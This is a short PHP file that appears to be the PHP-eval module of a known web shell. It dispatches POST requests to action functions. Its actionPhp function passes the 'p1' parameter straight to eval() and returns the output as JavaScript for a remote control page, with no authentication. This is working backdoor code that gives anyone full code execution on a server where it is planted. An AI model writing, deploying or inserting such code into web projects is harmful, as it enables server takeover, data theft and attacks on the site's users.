<?php
function actionPhp() {
	if(isset($_POST['ajax'])) {
		ob_start();
		eval($_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
}

if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
?>